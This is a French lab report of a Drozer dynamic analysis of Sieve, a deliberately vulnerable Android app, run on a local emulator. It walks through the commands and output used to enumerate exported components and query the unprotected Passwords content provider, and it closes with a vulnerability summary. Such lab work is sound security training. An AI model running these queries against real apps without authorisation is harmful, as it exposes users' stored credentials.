LAB - Analyse Dynamique avec Drozer : Application Sieve
Réalisé par : zouhairelghouate
Environnement : Windows (Local) | Android Emulator
Application cible : com.withsecure.example.sieve (Sieve v1.0)

Environnement utilisé
ÉlémentDétailSystème HôteWindows (Local)ÉmulateurGoogle sdk_gphone_x86_64 (API 11) — 9d36b7d204fffa88DrozerConsole v3.1.0Connexiondrozer console connect --server 127.0.0.1:31415

Outils utilisés

Drozer : Framework d'analyse dynamique des composants IPC Android.
ADB : Communication avec l'émulateur.


Étapes du Lab
Étape 1 — Connexion à la console Drozer
bashC:\...\platform-tools> drozer.exe console connect --server 127.0.0.1:31415
Selecting 9d36b7d204fffa88 (Google sdk_gphone_x86_64 11)
drozer Console (v3.1.0)
dz>

Étape 2 — Liste des modules disponibles
dz> list
ModuleDescriptionapp.activity.forintentTrouver les activités pouvant gérer un intentapp.activity.infoInformations sur les activités exportéesapp.activity.startDémarrer une Activityapp.broadcast.infoInformations sur les broadcast receiversapp.broadcast.sendEnvoyer un broadcast via un intentapp.broadcast.sniffEnregistrer un receiver pour sniffer des intentsapp.package.attacksurfaceSurface d'attaque du packageapp.package.backupPackages utilisant l'API backupapp.package.debuggablePackages déboguablesapp.package.infoInformations sur les packages installésapp.package.listLister les packagesapp.package.manifestRécupérer l'AndroidManifest.xmlapp.package.nativeTrouver les bibliothèques nativesapp.package.shareduidPackages avec UIDs partagésapp.provider.columnsLister les colonnes d'un content providerapp.provider.deleteSupprimer depuis un content providerapp.provider.downloadTélécharger un fichier depuis un content providerapp.provider.finduriTrouver les URIs dans un packageapp.provider.infoInformations sur les content providers exportésapp.provider.insertInsérer dans un Content Providerapp.provider.queryRequêter un content providerapp.provider.readLire depuis un content provider

Étape 3 — Recherche de l'application Sieve
dz> run app.package.list -f sieve
Attempting to run shell module
com.withsecure.example.sieve (Sieve)

Étape 4 — Surface d'attaque
dz> run app.package.attacksurface com.withsecure.example.sieve
Attempting to run shell module
Attack Surface:
  3 activities exported
  1 broadcast receivers exported
  2 content providers exported
  2 services exported
  is debuggable
Résumé de la surface d'attaque :
ComposantNombre exportéActivities3Broadcast Receivers1Content Providers2Services2Déboguable✅ Oui

Étape 5 — Informations détaillées sur le package
dz> run app.package.info -a com.withsecure.example.sieve
Package: com.withsecure.example.sieve
  Application Label: Sieve
  Process Name: com.withsecure.example.sieve
  Version: 1.0
  Data Directory: /data/user/0/com.withsecure.example.sieve
  APK Path: /data/app/~~DRe-fSJ2dZbajjKqCnI4kg==/com.withsecure.example.sieve-.../base.apk
  UID: 10170
  GID: [3003]
  Shared Libraries: [/system/framework/android.test.base.jar]
  Shared User ID: null
  Uses Permissions:
    - android.permission.POST_NOTIFICATIONS
    - android.permission.INTERNET
    - com.withsecure.example.sieve.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION
  Defines Permissions:
    - com.withsecure.example.sieve.READ_KEYS
    - com.withsecure.example.sieve.WRITE_KEYS
    - com.withsecure.example.sieve.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION

Étape 6 — Analyse des Content Providers
dz> run app.provider.info -a com.withsecure.example.sieve
DBContentProvider
Authority: com.withsecure.example.sieve.provider.DBContentProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.withsecure.example.sieve.provider.DBContentProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
  Path Permissions:
    Path: /Keys         Type: PATTERN_LITERAL
      Read Permission:  com.withsecure.example.sieve.READ_KEYS
      Write Permission: com.withsecure.example.sieve.WRITE_KEYS
    Path: /Keys/*       Type: PATTERN_LITERAL
      Read Permission:  com.withsecure.example.sieve.READ_KEYS
      Write Permission: com.withsecure.example.sieve.WRITE_KEYS
FileBackupProvider
Authority: com.withsecure.example.sieve.provider.FileBackupProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.withsecure.example.sieve.provider.FileBackupProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False

⚠️ Les deux providers ont Read/Write Permission: null — accessibles sans autorisation.


Étape 7 — Découverte des URIs (finduri)
dz> run app.provider.finduri com.withsecure.example.sieve
Scanning com.withsecure.example.sieve...
content://com.withsecure.example.sieve.androidx-startup
content://com.withsecure.example.sieve.provider.DBContentProvider/Keys/*/
content://com.withsecure.example.sieve.provider.DBContentProvider/Keys/
content://com.withsecure.example.sieve.androidx-startup/
content://com.withsecure.example.sieve.provider.FileBackupProvider
content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords/
content://com.withsecure.example.sieve.provider.FileBackupProvider/
content://com.withsecure.example.sieve.provider.DBContentProvider/Keys
content://com.withsecure.example.sieve.provider.DBContentProvider/
content://com.withsecure.example.sieve.provider.DBContentProvider
content://com.withsecure.example.sieve.provider.DBContentProvider/Keys/*
content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords

Étape 8 — Requête sur les mots de passe
dz> run app.provider.query content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords/
Attempting to run shell module
| _id | service | username | password | email |

La table Passwords est accessible sans aucune authentification — fuite directe des données sensibles.


Étape 9 — Analyse des Services
dz> run app.service.info -a com.withsecure.example.sieve
Package: com.withsecure.example.sieve
  com.withsecure.example.sieve.service.AuthService
    Permission: null
  com.withsecure.example.sieve.service.CryptoService
    Permission: null

⚠️ AuthService et CryptoService sont exportés sans aucune permission.


Étape 10 — Analyse des Broadcast Receivers
dz> run app.broadcast.info -a com.withsecure.example.sieve
Package: com.withsecure.example.sieve
  androidx.profileinstaller.ProfileInstallReceiver
    Permission: android.permission.DUMP

Récapitulatif des vulnérabilités
ComposantVulnérabilitéRisqueDBContentProviderRead/Write Permission nullLecture des mots de passe sans authFileBackupProviderRead/Write Permission nullDirectory Traversal possibleAuthServicePermission nullAccès direct au service d'authCryptoServicePermission nullAccès direct au service cryptoApplicationis debuggableAnalyse et manipulation facilitéesDBContentProvider/Passwords/Requête sans authExfiltration directe des credentials

Conclusion
L'analyse de l'application Sieve avec Drozer v3.1.0 a révélé une surface d'attaque critique : 3 activités, 2 services, 2 content providers et 1 broadcast receiver exportés. La vulnérabilité la plus grave est la lecture directe de la table Passwords via DBContentProvider sans aucune permission, exposant les identifiants de tous les utilisateurs.
